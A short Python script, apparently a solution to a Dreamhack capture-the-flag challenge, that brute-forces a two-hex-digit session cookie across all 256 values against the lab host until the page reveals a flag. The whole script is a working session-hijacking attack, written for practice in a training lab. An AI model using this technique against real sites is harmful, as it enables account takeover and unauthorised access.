import requests

url = 'http://host3.dreamhack.games:23186/'
cookies = {
}

for i in range(256):
    cookies['sessionid'] = f'{i:02x}'
    # cookies['sessionid'] = format(i, '02x')
    # cookies['sessionid'] = hex(i)[2:].zfill(2)
    response = requests.get(url, cookies=cookies)

    if 'flag' in response.text:
        print(f'sessionid is {cookies["sessionid"]}')
        print(response.text)
        break
